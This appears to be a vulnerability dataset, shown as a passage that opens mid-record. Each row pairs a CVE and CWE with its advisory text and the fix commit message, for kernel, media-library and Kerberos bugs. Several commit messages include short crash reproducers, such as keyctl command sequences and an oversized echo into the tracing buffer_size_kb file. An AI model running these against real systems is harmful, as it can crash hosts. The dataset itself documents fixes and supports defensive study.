00000000000006e0 	Stack: 	 ffff88003dd8bdf0 ffffffff81160a8a 0000000000000000 00000000ffffff82 	 ffff88003dd8be68 ffff88007d027600 ffff88003dd8bdf0 ffffffff810a39e5 	 ffff88003dd8be20 ffffffff812a31ab ffff88007d027600 ffff88007d027620 	Call Trace: 	 [<ffffffff810a39e5>] kfree_call_rcu+0x15/0x20 kernel/rcu/tree.c:3136 	 [<ffffffff812a31ab>] user_update+0x8b/0xb0 security/keys/user_defined.c:129 	 [<     inline     >] __key_update security/keys/key.c:730 	 [<ffffffff8129e5c1>] key_create_or_update+0x291/0x440 security/keys/key.c:908 	 [<     inline     >] SYSC_add_key security/keys/keyctl.c:125 	 [<ffffffff8129fc21>] SyS_add_key+0x101/0x1e0 security/keys/keyctl.c:60 	 [<ffffffff8185f617>] entry_SYSCALL_64_fastpath+0x12/0x6a arch/x86/entry/entry_64.S:185  Note the error code (-ENOKEY) in EDX.  A similar bug can be tripped by:      keyctl request2 trusted user """" @U     keyctl add trusted user ""a"" @U  This should also affect encrypted keys - but that has to be correctly parameterised or it will fail with EINVAL before getting to the bit that will crashes.  Reported-by: Dmitry Vyukov <dvyukov@google.com> Signed-off-by: David Howells <dhowells@redhat.com> Acked-by: Mimi Zohar <zohar@linux.vnet.ibm.com> Signed-off-by: James Morris <james.l.morris@oracle.com>"
CVE-2013-6381,CWE-119,2013-11-27,Buffer overflow in the qeth_snmp_command function in drivers/s390/net/qeth_core_main.c in the Linux kernel through 3.12.1 allows local users to cause a denial of service or possibly have unspecified other impact via an SNMP ioctl call with a length value that is incompatible with the command-buffer size.,Check user-defined length in snmp ioctl request and allow request only if it fits into a qeth command buffer.  Signed-off-by: Ursula Braun <ursula.braun@de.ibm.com> Signed-off-by: Frank Blaschka <frank.blaschka@de.ibm.com> Reviewed-by: Heiko Carstens <heicars2@linux.vnet.ibm.com> Reported-by: Nico Golde <nico@ngolde.de> Reported-by: Fabian Yamaguchi <fabs@goesec.de> Cc: <stable@vger.kernel.org> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2010-2060,,2010-06-08,"The put command functionality in beanstalkd 1.4.5 and earlier allows remote attackers to execute arbitrary Beanstalk commands via the body in a job that is too big, which is not properly handled by the dispatch_cmd function in prot.c.","Previously, a malicious user could craft a job payload and inject beanstalk commands without the client application knowing. (An extra-careful client library could check the size of the job body before sending the put command, but most libraries do not do this, nor should they have to.)  Reported by Graham Barr."
CVE-2016-6254,CWE-119,2016-08-19,Heap-based buffer overflow in the parse_packet function in network.c in collectd before 5.4.3 and 5.x before 5.5.2 allows remote attackers to cause a denial of service (daemon crash) or possibly execute arbitrary code via a crafted network packet.,"Emilien Gaspar has identified a heap overflow in parse_packet(), the function used by the network plugin to parse incoming network packets.  This is a vulnerability in collectd, though the scope is not clear at this point. At the very least specially crafted network packets can be used to crash the daemon. We can't rule out a potential remote code execution though.  Fixes: CVE-2016-6254"
CVE-2018-16645,CWE-770,2018-09-06,"There is an excessive memory allocation issue in the functions ReadBMPImage of coders/bmp.c and ReadDIBImage of coders/dib.c in ImageMagick 7.0.8-11, which allows remote attackers to cause a denial of service via a crafted image file.",
CVE-2019-12730,CWE-908,2019-06-04,aa_read_header in libavformat/aadec.c in FFmpeg before 3.2.14 and 4.x before 4.1.4 does not check for sscanf failure and consequently allows use of uninitialized variables.,Fixes: use of uninitialized variables Fixes: blank.aa  Found-by: Chamal De Silva <chamal.desilva@gmail.com> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2018-10540,CWE-787,2018-04-29,"An issue was discovered in WavPack 5.1.0 and earlier for W64 input. Out-of-bounds writes can occur because ParseWave64HeaderConfig in wave64.c does not validate the sizes of unknown chunks before attempting memory allocation, related to a lack of integer-overflow protection within a bytes_to_copy calculation and subsequent malloc call, leading to insufficient memory allocation.",
CVE-2017-13008,CWE-125,2017-09-14,The IEEE 802.11 parser in tcpdump before 4.9.2 has a buffer over-read in print-802_11.c:parse_elements().,"offset has already been advanced to point to the bitmap; we shouldn't add the amount to advance again.  This fixes a buffer over-read discovered by Brian 'geeknik' Carpenter.  Add a test using the capture file supplied by the reporter(s).  While we're at it, remove some redundant tests - we've already checked, before the case statement, whether we have captured the entire information element and whether the entire information element is present in the on-the-wire packet; in the cases for particular IEs, we only need to make sure we don't go past the end of the IE."
CVE-2019-10714,CWE-125,2019-04-02,"LocaleLowercase in MagickCore/locale.c in ImageMagick before 7.0.8-32 allows out-of-bounds access, leading to a SIGSEGV.",
CVE-2013-7011,CWE-119,2013-12-09,"The read_header function in libavcodec/ffv1dec.c in FFmpeg before 2.1 does not prevent changes to global parameters, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted FFV1 data.",Such changes are not allowed nor supported  Fixes Ticket2906  Found-by: ami_stuff Signed-off-by: Michael Niedermayer <michaelni@gmx.at>
CVE-2016-6911,CWE-125,2017-01-26,The dynamicGetbuf function in the GD Graphics Library (aka libgd) before 2.2.4 allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted TIFF image.,"tiff_invalid_read.tiff is corrupt, and causes an invalid read in gdImageCreateFromTiffPtr(), but not in gdImageCreateFromTiff(). The culprit is dynamicGetbuf(), which doesn't check for out-of-bound reads. In this case, dynamicGetbuf() is called with a negative dp->pos, but also positive buffer overflows have to be handled, in which case 0 has to be returned (cf. commit 75e29a9).  Fixing dynamicGetbuf() exhibits that the corrupt TIFF would still create the image, because the return value of TIFFReadRGBAImage() is not checked. We do that, and let createFromTiffRgba() fail if TIFFReadRGBAImage() fails.  This issue had been reported by Ibrahim El-Sayed to security@libgd.org.  CVE-2016-6911"
CVE-2016-9754,CWE-190,2017-01-05,"The ring_buffer_resize function in kernel/trace/ring_buffer.c in the profiling subsystem in the Linux kernel before 4.6.1 mishandles certain integer calculations, which allows local users to gain privileges by writing to the /sys/kernel/debug/tracing/buffer_size_kb file.","If the size passed to ring_buffer_resize() is greater than MAX_LONG - BUF_PAGE_SIZE then the DIV_ROUND_UP() will return zero.  Here's the details:    # echo 18014398509481980 > /sys/kernel/debug/tracing/buffer_size_kb  tracing_entries_write() processes this and converts kb to bytes.   18014398509481980 << 10 = 18446744073709547520  and this is passed to ring_buffer_resize() as unsigned long size.   size = DIV_ROUND_UP(size, BUF_PAGE_SIZE);  Where DIV_ROUND_UP(a, b) is (a + b - 1)/b  BUF_PAGE_SIZE is 4080 and here   18446744073709547520 + 4080 - 1 = 18446744073709551599  where 18446744073709551599 is still smaller than 2^64   2^64 - 18446744073709551599 = 17  But now 18446744073709551599 / 4080 = 4521260802379792  and size = size * 4080 = 18446744073709551360  This is checked to make sure its still greater than 2 * 4080, which it is.  Then we convert to the number of buffer pages needed.   nr_page = DIV_ROUND_UP(size, BUF_PAGE_SIZE)  but this time size is 18446744073709551360 and   2^64 - (18446744073709551360 + 4080 - 1) = -3823  Thus it overflows and the resulting number is less than 4080, which makes    3823 / 4080 = 0  an nr_pages is set to this. As we already checked against the minimum that nr_pages may be, this causes the logic to fail as well, and we crash the kernel.  There's no reason to have the two DIV_ROUND_UP() (that's just result of historical code changes), clean up the code and fix this bug.  Cc: stable@vger.kernel.org # 3.5+ Fixes: 83f4031 (""ring-buffer: Make removal of ring buffer pages atomic"") Signed-off-by: Steven Rostedt <rostedt@goodmis.org>"
CVE-2015-2697,CWE-125,2015-11-09,The build_principal_va function in lib/krb5/krb/bld_princ.c in MIT Kerberos 5 (aka krb5) before 1.14 allows remote authenticated users to cause a denial of service (out-of-bounds read and KDC crash) via an initial '\0' character in a long realm field within a TGS request.,"In build_principal_va(), use k5memdup0() instead of strdup() to make a copy of the realm, to ensure that we allocate the correct number of bytes and do not read past the end of the input string.  This bug affects krb5_build_principal(), krb5_build_principal_va(), and krb5_build_principal_alloc_va().  krb5_build_principal_ext() is not affected.  CVE-2015-2697:  In MIT krb5 1.7 and later, an authenticated attacker may be able to cause a KDC to crash using a TGS request with a large realm field beginning with a null byte.  If the KDC attempts to find a referral to answer the request, it constructs a principal name for lookup using krb5_build_principal() with the requested realm.  Due to a bug in this function, the null byte causes only one byte be allocated for the realm field of the constructed principal, far less than its length. Subsequent operations on the lookup principal may cause a read beyond the end of the mapped memory region, causing the KDC process to crash.  CVSSv2: AV:N/AC:L/Au:S/C:N/I:N/A:C/E:POC/RL:OF/RC:C  ticket: 8252 (new) target_version: 1.14 tags: pullup"
CVE-2016-5842,CWE-125,2016-12-13,"MagickCore/property.c in ImageMagick before 7.0.2-1 allows remote attackers to obtain sensitive memory information via vectors involving the q variable, which triggers an out-of-bounds read.",
CVE-2018-1068,CWE-119,2018-03-16,A flaw was found in the Linux 4.x kernel's implementation of 32-bit syscall interface for bridging. This allowed a privileged user to arbitrarily write to a limited range of kernel memory.,"We need to make sure the offsets are not out of range of the total size. Also check that they are in ascending order.  The WARN_ON triggered by syzkaller (it sets panic_on_warn) is changed to also bail out, no point in continuing parsing.  Briefly tested with simple ruleset of -A INPUT --limit 1/s' --log plus jump to custom chains using 32bit ebtables binary.  Reported-by: <syzbot+845a53d13171abf8bf29@syzkaller.appspotmail.com> Signed-off-by: Florian Westphal <fw@strlen.de> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>"
CVE-2018-14463,CWE-125,2019-10-03,"The VRRP parser in tcpdump before 4.9.3 has a buffer over-read in print-vrrp.c:vrrp_print() for VRRP version 2, a different vulnerability than CVE-2019-15167.",In vrrp_print().  This fixes a buffer over-read discovered by Bhargava Shastry.  Add a test using the capture file supplied by the reporter(s).
CVE-2018-11508,CWE-200,2018-05-28,The compat_get_timex function in kernel/compat.c in the Linux kernel before 4.16.9 allows local users to obtain sensitive information from kernel memory via adjtimex.,"Commit 3a4d44b (""ntp: Move adjtimex related compat syscalls to native counterparts"") removed the memset() in compat_get_timex().  Since then, the compat adjtimex syscall can invoke do_adjtimex() with an uninitialized ->tai.  If do_adjtimex() doesn't write to ->tai (e.g.  because the arguments are invalid), compat_put_timex() then copies the uninitialized ->tai field to userspace.  Fix it by adding the memset() back.  Fixes: 3a4d44b (""ntp: Move adjtimex related compat syscalls to native counterparts"") Signed-off-by: Jann Horn <jannh@google.com> Acked-by: Kees Cook <keescook@chromium.org> Acked-by: Al Viro <viro@zeniv.linux.org.uk> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2014-9529,CWE-362,2015-01-09,Race condition in the key_gc_unused_keys function in security/keys/gc.c in the Linux kernel through 3.18.2 allows local users to cause a denial of service (memory corruption or panic) or possibly have unspecified other impact via keyctl commands that trigger access to a key structure member during garbage collection of a key.,"When a key is being garbage collected, it's key->user would get put before the ->destroy() callback is called, where the key is removed from it's respective tracking structures.  This leaves a key hanging in a semi-invalid state which leaves a window open for a different task to try an access key->user. An example is find_keyring_by_name() which would dereference key->user for a key that is in the process of being garbage collected (where key->user was freed but ->destroy() wasn't called yet - so it's still present in the linked list).  This would cause either a panic, or corrupt memory.  Fixes CVE-2014-9529.  Signed-off-by: Sasha Levin <sasha.levin@oracle.com> Signed-off-by: David Howells <dhowells@redhat.com>"
CVE-2017-16359,CWE-476,2017-11-01,"In radare 2.0.1, a pointer wraparound vulnerability exists in store_versioninfo_gnu_verdef() in libr/bin/format/elf/elf.c.",
CVE-2019-11411,CWE-787,2019-04-22,An issue was discovered in Artifex MuJS 1.0.5. The Number#toFixed() and numtostr implementations in jsnumber.c have a stack-based buffer overflow.,"32 is not enough to fit sprintf(""%.20f"", 1e20). We need at least 43 bytes to fit that format. Bump the static buffer size."
CVE-2017-7177,CWE-358,2017-03-18,Suricata before 3.2.1 has an IPv4 defragmentation evasion issue caused by lack of a check for the IP protocol during fragment matching.,"The IP protocol was not being used to match fragments with their packets allowing a carefully constructed packet with a different protocol to be matched, allowing re-assembly to complete, creating a packet that would not be re-assembled by the destination host."
CVE-2015-8812,,2016-04-27,"drivers/infiniband/hw/cxgb3/iwch_cm.c in the Linux kernel before 4.5 does not properly identify error conditions, which allows remote attackers to execute arbitrary code or cause a denial of service (use-after-free) via crafted packets.","The cxgb3_*_send() functions return NET_XMIT_ values, which are positive integers values. So don't treat positive return values as an error.  Signed-off-by: Steve Wise <swise@opengridcomputing.com> Signed-off-by: Hariprasad Shenai <hariprasad@chelsio.com> Signed-off-by: Doug Ledford <dledford@redhat.com>"
CVE-2016-5771,CWE-416,2016-08-07,"spl_array.c in the SPL extension in PHP before 5.5.37 and 5.6.x before 5.6.23 improperly interacts with the unserialize implementation and garbage collection, which allows remote attackers to execute arbitrary code or cause a denial of service (use-after-free and application crash) via crafted serialized data.",
CVE-2017-8064,CWE-119,2017-04-23,"drivers/media/usb/dvb-usb-v2/dvb_usb_core.c in the Linux kernel 4.9.x and 4.10.x before 4.10.12 interacts incorrectly with the CONFIG_VMAP_STACK option, which allows local users to cause a denial of service (system crash or memory corruption) or possibly have unspecified other impact by leveraging use of more than one virtual page for a DMA scatterlist.","I ran into a stack frame size warning because of the on-stack copy of the USB device structure:  drivers/media/usb/dvb-usb-v2/dvb_usb_core.c: In function 'dvb_usbv2_disconnect': drivers/media/usb/dvb-usb-v2/dvb_usb_core.c:1029:1: error: the frame size of 1104 bytes is larger than 1024 bytes [-Werror=frame-larger-than=]  Copying a device structure like this is wrong for a number of other reasons too aside from the possible stack overflow. One of them is that the dev_info() call will print the name of the device later, but AFAICT we have only copied a pointer to the name earlier and the actual name has been freed by the time it gets printed.  This removes the on-stack copy of the device and instead copies the device name using kstrdup(). I'm ignoring the possible failure here as both printk() and kfree() are able to deal with NULL pointers.  Signed-off-by: Arnd Bergmann <arnd@arndb.de> Signed-off-by: Mauro Carvalho Chehab <mchehab@s-opensource.com>"
CVE-2012-2121,CWE-264,2012-05-17,"The KVM implementation in the Linux kernel before 3.3.4 does not properly manage the relationships between memory slots and the iommu, which allows guest OS users to cause a denial of service (memory leak and host OS crash) by leveraging administrative access to the guest OS to conduct hotunplug and hotplug operations on devices.","commit 32f6daa upstream.  We've been adding new mappings, but not destroying old mappings. This can lead to a page leak as pages are pinned using get_user_pages, but only unpinned with put_page if they still exist in the memslots list on vm shutdown.  A memslot that is destroyed while an iommu domain is enabled for the guest will therefore result in an elevated page reference count that is never cleared.  Additionally, without this fix, the iommu is only programmed with the first translation for a gpa.  This can result in peer-to-peer errors if a mapping is destroyed and replaced by a new mapping at the same gpa as the iommu will still be pointing to the original, pinned memory address.  Signed-off-by: Alex Williamson <alex.williamson@redhat.com> Signed-off-by: Marcelo Tosatti <mtosatti@redhat.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2018-18710,CWE-200,2018-10-29,An issue was discovered in the Linux kernel through 4.19. An information leak in cdrom_ioctl_select_disc in drivers/cdrom/cdrom.c could be used by local attackers to read kernel memory because a cast from unsigned long to int interferes with bounds checking. This is similar to CVE-2018-10940 and CVE-2018-16658.,There is another cast from unsigned long to int which causes a bounds check to fail with specially crafted input. The value is then used as an index in the slot array in cdrom_slot_status().  This issue is similar to CVE-2018-16658 and CVE-2018-10940.  Signed-off-by: Young_X <YangX92@hotmail.com> Signed-off-by: Jens Axboe <axboe@kernel.dk>
CVE-2014-5355,,2015-02-20,"MIT Kerberos 5 (aka krb5) through 1.13.1 incorrectly expects that a krb5_read_message data field is represented as a string ending with a '\0' character, which allows remote attackers to (1) cause a denial of service (NULL pointer dereference) via a zero-byte version string or (2) cause a denial of service (out-of-bounds read) by omitting the '\0' character, related to appl/user_user/server.c and lib/krb5/krb/recvauth.c.","In recvauth_common, do not use strcmp against the data fields of krb5_data objects populated by krb5_read_message(), as there is no guarantee that they are C strings.  Instead, create an expected krb5_data value and use data_eq().  In the sample user-to-user server application, check that the received client principal name is null-terminated before using it with printf and krb5_parse_name.  CVE-2014-5355:  In MIT krb5, when a server process uses the krb5_recvauth function, an unauthenticated remote attacker can cause a NULL dereference by sending a zero-byte version string, or a read beyond the end of allocated storage by sending a non-null-terminated version string. The example user-to-user server application (uuserver) is similarly vulnerable to a zero-length or non-null-terminated principal name string.  The krb5_recvauth function reads two version strings from the client using krb5_read_message(), which produces a krb5_data structure containing a length and a pointer to an octet sequence.  krb5_recvauth assumes that the data pointer is a valid C string and passes it to strcmp() to verify the versions.  If the client sends an empty octet sequence, the data pointer will be NULL and strcmp() will dereference a NULL pointer, causing the process to crash.  If the client sends a non-null-terminated octet sequence, strcmp() will read beyond the end of the allocated storage, possibly causing the process to crash.  uuserver similarly uses krb5_read_message() to read a client principal name, and then passes it to printf() and krb5_parse_name() without verifying that it is a valid C string.  The krb5_recvauth function is used by kpropd and the Kerberized versions of the BSD rlogin and rsh daemons.  These daemons are usually run out of inetd or in a mode which forks before processing incoming connections, so a process crash will generally not result in a complete denial of service.  Thanks to Tim Uglow for discovering this issue.  CVSSv2: AV:N/AC:L/Au:N/C:N/I:N/A:P/E:POC/RL:OF/RC:C  [tlyu@mit.edu: CVSS score]  ticket: 8050 (new) target_version: 1.13.1 tags: pullup"
CVE-2015-7540,CWE-399,2015-12-29,"The LDAP server in the AD domain controller in Samba 4.x before 4.1.22 does not check return values to ensure successful ASN.1 memory allocation, which allows remote attackers to cause a denial of service (memory consumption and daemon crash) via crafted packets.",
CVE-2017-15128,CWE-119,2018-01-14,A flaw was found in the hugetlb_mcopy_atomic_pte function in mm/hugetlb.c in the Linux kernel before 4.13.12. A lack of size check could cause a denial of service (BUG).,"This oops:    kernel BUG at fs/hugetlbfs/inode.c:484!   RIP: remove_inode_hugepages+0x3d0/0x410   Call Trace:     hugetlbfs_setattr+0xd9/0x130     notify_change+0x292/0x410     do_truncate+0x65/0xa0     do_sys_ftruncate.constprop.3+0x11a/0x180     SyS_ftruncate+0xe/0x10     tracesys+0xd9/0xde  was caused by the lack of i_size check in hugetlb_mcopy_atomic_pte.  mmap() can still succeed beyond the end of the i_size after vmtruncate zapped vmas in those ranges, but the faults must not succeed, and that includes UFFDIO_COPY.  We could differentiate the retval to userland to represent a SIGBUS like a page fault would do (vs SIGSEGV), but it doesn't seem very useful and we'd need to pick a random retval as there's no meaningful syscall retval that would differentiate from SIGSEGV and SIGBUS, there's just -EFAULT.  Link: http://lkml.kernel.org/r/20171016223914.2421-2-aarcange@redhat.com Signed-off-by: Andrea Arcangeli <aarcange@redhat.com> Reviewed-by: Mike Kravetz <mike.kravetz@oracle.com> Cc: Mike Rapoport <rppt@linux.vnet.ibm.com> Cc: ""Dr. David Alan Gilbert"" <dgilbert@redhat.com> Cc: <stable@vger.kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2019-15924,CWE-476,2019-09-04,An issue was discovered in the Linux kernel before 5.0.11. fm10k_init_module in drivers/net/ethernet/intel/fm10k/fm10k_main.c has a NULL pointer dereference because there is no -ENOMEM upon an alloc_workqueue failure.,"Syzkaller report this:  kasan: GPF could be caused by NULL-ptr deref or user memory access general protection fault: 0000 [#1] SMP KASAN PTI CPU: 0 PID: 4378 Comm: syz-executor.0 Tainted: G         C        5.0.0+ #5 Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014 RIP: 0010:__lock_acquire+0x95b/0x3200 kernel/locking/lockdep.c:3573 Code: 00 0f 85 28 1e 00 00 48 81 c4 08 01 00 00 5b 5d 41 5c 41 5d 41 5e 41 5f c3 4c 89 ea 48 b8 00 00 00 00 00 fc ff df 48 c1 ea 03 <80> 3c 02 00 0f 85 cc 24 00 00 49 81 7d 00 e0 de 03 a6 41 bc 00 00 RSP: 0018:ffff8881e3c07a40 EFLAGS: 00010002 RAX: dffffc0000000000 RBX: 0000000000000000 RCX: 0000000000000000 RDX: 0000000000000010 RSI: 0000000000000000 RDI: 0000000000000080 RBP: 0000000000000000 R08: 0000000000000001 R09: 0000000000000000 R10: ffff8881e3c07d98 R11: ffff8881c7f21f80 R12: 0000000000000001 R13: 0000000000000080 R14: 0000000000000000 R15: 0000000000000001 FS:  00007fce2252e700(0000) GS:ffff8881f2400000(0000) knlGS:0000000000000000 CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033 CR2: 00007fffc7eb0228 CR3: 00000001e5bea002 CR4: 00000000007606f0 DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000 DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400 PKRU: 55555554 Call Trace:  lock_acquire+0xff/0x2c0 kernel/locking/lockdep.c:4211  __mutex_lock_common kernel/locking/mutex.c:925 [inline]  __mutex_lock+0xdf/0x1050 kernel/locking/mutex.c:1072  drain_workqueue+0x24/0x3f0 kernel/workqueue.c:2934  destroy_workqueue+0x23/0x630 kernel/workqueue.c:4319  __do_sys_delete_module kernel/module.c:1018 [inline]  __se_sys_delete_module kernel/module.c:961 [inline]  __x64_sys_delete_module+0x30c/0x480 kernel/module.c:961  do_syscall_64+0x9f/0x450 arch/x86/entry/common.c:290  entry_SYSCALL_64_after_hwframe+0x49/0xbe RIP: 0033:0x462e99 Code: f7 d8 64 89 02 b8 ff ff ff ff c3 66 0f 1f 44 00 00 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 bc ff ff ff f7 d8 64 89 01 48 RSP: 002b:00007fce2252dc58 EFLAGS: 00000246 ORIG_RAX: 00000000000000b0 RAX: ffffffffffffffda RBX: 000000000073bf00 RCX: 0000000000462e99 RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000020000140 RBP: 0000000000000002 R08: 0000000000000000 R09: 0000000000000000 R10: 0000000000000000 R11: 0000000000000246 R12: 00007fce2252e6bc R13: 00000000004bcca9 R14: 00000000006f6b48 R15: 00000000ffffffff  If alloc_workqueue fails, it should return -ENOMEM, otherwise may trigger this NULL pointer dereference while unloading drivers.  Reported-by: Hulk Robot <hulkci@huawei.com> Fixes: 0a38c17 (""fm10k: Remove create_workqueue"") Signed-off-by: Yue Haibing <yuehaibing@huawei.com> Tested-by: Andrew Bowers <andrewx.bowers@intel.com> Signed-off-by: Jeff Kirsher <jeffrey.t.kirsher@intel.com>"
CVE-2018-16541,CWE-416,2018-09-05,"In Artifex Ghostscript before 9.24, attackers able to supply crafted PostScript files could use incorrect free logic in pagedevice replacement to crash the interpreter.",
CVE-2016-3183,CWE-125,2017-02-03,The sycc422_t_rgb function in common/color.c in OpenJPEG before 2.1.1 allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted jpeg2000 file.,42x Images with an odd x0/y0 lead to subsampled component starting at the 2nd column/line. That is offset = comp->dx * comp->x0 - image->x0 = 1  Fix #726
CVE-2017-12192,CWE-476,2017-10-12,"The keyctl_read_key function in security/keys/keyctl.c in the Key Management subcomponent in the Linux kernel before 4.13.5 does not properly consider that a key may be possessed but negatively instantiated, which allows local users to cause a denial of service (OOPS and system crash) via a crafted KEYCTL_READ operation.","Because keyctl_read_key() looks up the key with no permissions requested, it may find a negatively instantiated key.  If the key is also possessed, we went ahead and called ->read() on the key.  But the key payload will actually contain the ->reject_error rather than the normal payload.  Thus, the kernel oopses trying to read the user_key_payload from memory address (int)-ENOKEY = 0x00000000ffffff82.  Fortunately the payload data is stored inline, so it shouldn't be possible to abuse this as an arbitrary memory read primitive...  Reproducer:     keyctl new_session     keyctl request2 user desc '' @s     keyctl read $(keyctl show | awk '/user: desc/ {print $1}')  It causes a crash like the following:      BUG: unable to handle kernel paging request at 00000000ffffff92      IP: user_read+0x33/0xa0      PGD 36a54067 P4D 36a54067 PUD 0      Oops: 0000 [#1] SMP      CPU: 0 PID: 211 Comm: keyctl Not tainted 4.14.0-rc1 #337      Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-20170228_101828-anatol 04/01/2014      task: ffff90aa3b74c3c0 task.stack: ffff9878c0478000      RIP: 0010:user_read+0x33/0xa0      RSP: 0018:ffff9878c047bee8 EFLAGS: 00010246      RAX: 0000000000000001 RBX: ffff90aa3d7da340 RCX: 0000000000000017      RDX: 0000000000000000 RSI: 00000000ffffff82 RDI: ffff90aa3d7da340      RBP: ffff9878c047bf00 R08: 00000024f95da94f R09: 0000000000000000      R10: 0000000000000001 R11: 0000000000000000 R12: 0000000000000000      R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000      FS:  00007f58ece69740(0000) GS:ffff90aa3e200000(0000) knlGS:0000000000000000      CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033      CR2: 00000000ffffff92 CR3: 0000000036adc001 CR4: 00000000003606f0      Call Trace:       keyctl_read_key+0xac/0xe0       SyS_keyctl+0x99/0x120       entry_SYSCALL_64_fastpath+0x1f/0xbe      RIP: 0033:0x7f58ec787bb9      RSP: 002b:00007ffc8d401678 EFLAGS: 00000206 ORIG_RAX: 00000000000000fa      RAX: ffffffffffffffda RBX: 00007ffc8d402800 RCX: 00007f58ec787bb9      RDX: 0000000000000000 RSI: 00000000174a63ac RDI: 000000000000000b      RBP: 0000000000000004 R08: 00007ffc8d402809 R09: 0000000000000020      R10: 0000000000000000 R11: 0000000000000206 R12: 00007ffc8d402800      R13: 00007ffc8d4016e0 R14: 0000000000000000 R15: 0000000000000000      Code: e5 41 55 49 89 f5 41 54 49 89 d4 53 48 89 fb e8 a4 b4 ad ff 85 c0 74 09 80 3d b9 4c 96 00 00 74 43 48 8b b3 20 01 00 00 4d 85 ed <0f> b7 5e 10 74 29 4d 85 e4 74 24 4c 39 e3 4c 89 e2 4c 89 ef 48      RIP: user_read+0x33/0xa0 RSP: ffff9878c047bee8      CR2: 00000000ffffff92  Fixes: 61ea0c0 (""KEYS: Skip key state checks when checking for possession"") Cc: <stable@vger.kernel.org>	[v3.13+] Signed-off-by: Eric Biggers <ebiggers@google.com> Signed-off-by: David Howells <dhowells@redhat.com>"
CVE-2016-2549,CWE-20,2016-04-27,"sound/core/hrtimer.c in the Linux kernel before 4.4.1 does not prevent recursive callback access, which allows local users to cause a denial of service (deadlock) via a crafted ioctl call.","hrtimer_cancel() waits for the completion from the callback, thus it must not be called inside the callback itself.  This was already a problem in the past with ALSA hrtimer driver, and the early commit [fcfdebe: ALSA: hrtimer - Fix lock-up] tried to address it.  However, the previous fix is still insufficient: it may still cause a lockup when the ALSA timer instance reprograms itself in its callback. Then it invokes the start function even in snd_timer_interrupt() that is called in hrtimer callback itself, results in a CPU stall.  This is no hypothetical problem but actually triggered by syzkaller fuzzer.  This patch tries to fix the issue again.  Now we call hrtimer_try_to_cancel() at both start and stop functions so that it won't fall into a deadlock, yet giving some chance to cancel the queue if the functions have been called outside the callback.  The proper hrtimer_cancel() is called in anyway at closing, so this should be enough.  Reported-and-tested-by: Dmitry Vyukov <dvyukov@google.com> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>"
CVE-2017-7272,CWE-918,2017-03-27,"PHP through 7.1.11 enables potential SSRF in applications that accept an fsockopen or pfsockopen hostname argument with an expectation that the port number is constrained. Because a :port syntax is recognized, fsockopen will use the port number that is specified in the hostname argument, instead of the port number in the second argument of the function.","For historical reasons, fsockopen() accepts the port and hostname separately: fsockopen('127.0.0.1', 80)  However, with the introdcution of stream transports in PHP 4.3, it became possible to include the port in the hostname specifier:  fsockopen('127.0.0.1:80') Or more formally: fsockopen('tcp://127.0.0.1:80')  Confusing results when these two forms are combined, however. fsockopen('127.0.0.1:80', 443) results in fsockopen() attempting to connect to '127.0.0.1:80:443' which any reasonable stack would consider invalid.  Unfortunately, PHP parses the address looking for the first colon (with special handling for IPv6, don't worry) and calls atoi() from there.  atoi() in turn, simply stops parsing at the first non-numeric character and returns the value so far.  The end result is that the explicitly supplied port is treated as ignored garbage, rather than producing an error.  This diff replaces atoi() with strtol() and inspects the stop character.  If additional ""garbage"" of any kind is found, it fails and returns an error."
CVE-2014-1446,CWE-399,2014-01-18,"The yam_ioctl function in drivers/net/hamradio/yam.c in the Linux kernel before 3.12.8 does not initialize a certain structure member, which allows local users to obtain sensitive information from kernel memory by leveraging the CAP_NET_ADMIN capability for an SIOCYAMGCFG ioctl call.",The yam_ioctl() code fails to initialise the cmd field of the struct yamdrv_ioctl_cfg. Add an explicit memset(0) before filling the structure to avoid the 4-byte info leak.  Signed-off-by: Salva Peiró <speiro@ai2.upv.es> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2013-4160,,2014-01-21,"Little CMS (lcms2) before 2.5, as used in OpenJDK 7 and possibly other products, allows remote attackers to cause a denial of service (NULL pointer dereference and crash) via vectors related to (1) cmsStageAllocLabV2ToV4curves, (2) cmsPipelineDup, (3) cmsAllocProfileSequenceDescription, (4) CurvesAlloc, and (5) cmsnamed.",
CVE-2016-8646,CWE-476,2016-11-28,The hash_accept function in crypto/algif_hash.c in the Linux kernel before 4.3.6 allows local users to cause a denial of service (OOPS) by attempting to trigger use of in-kernel hash algorithms for a socket that has received zero bytes of data.,The hash_accept call fails to work on sockets that have not received any data.  For some algorithm implementations it may cause crashes.  This patch fixes this by ensuring that we only export and import on sockets that have received data.  Cc: stable@vger.kernel.org Reported-by: Harsh Jain <harshjain.prof@gmail.com> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au> Tested-by: Stephan Mueller <smueller@chronox.de>
CVE-2012-2143,CWE-310,2012-07-05,"The crypt_des (aka DES-based crypt) function in FreeBSD before 9.0-RELEASE-p2, as used in PHP, PostgreSQL, and other products, does not process the complete cleartext password if this password contains a 0x80 character, which makes it easier for context-dependent attackers to obtain access via an authentication attempt with an initial substring of the intended password, as demonstrated by a Unicode password.",
